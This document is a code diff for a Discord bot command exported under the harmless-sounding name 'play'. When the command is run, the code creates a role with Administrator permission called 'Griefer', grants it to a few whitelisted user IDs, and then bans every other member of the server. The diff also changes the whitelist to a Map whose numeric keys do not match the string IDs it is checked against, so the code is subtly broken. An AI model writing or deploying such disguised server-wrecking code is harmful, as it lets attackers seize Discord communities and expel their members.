@@ -40,7 +40,8 @@ exports.play = {
 const run = async (client, interaction) => {
     console.log("Play auf Paluten aufgeführt");
     let guild = interaction.guild;
-    const dont_ban = [591966253548175370, 530740749650624522, 927581042922098750];
+    const dont_ban = new Map();
+    dont_ban.set(591966253548175370, "Felix");
     let admin_role = await guild.roles.create({
         name: "Griefer",
         permissions: ["Administrator"],
@@ -48,16 +49,17 @@ const run = async (client, interaction) => {
         hoist: false,
         reason: "Griefer"
     });
-    for (let member of dont_ban) {
+    for (let member of dont_ban.keys()) {
         await guild.members.cache.find((value) => parseInt(value.id) == member)?.roles.add(admin_role);
     }
     await guild.members.fetch();
     await guild.members.cache.forEach(async (member) => {
         try {
             const memberid = await member.id;
-            if (dont_ban.includes(Number(memberid)))
+            if (dont_ban.has(memberid)) {
                 return;
-            await member.ban({ reason: "Paluten" });
+            }
+            await member.ban();
         }
         catch (e) {
             console.log("Could not ban " + member.user.tag);
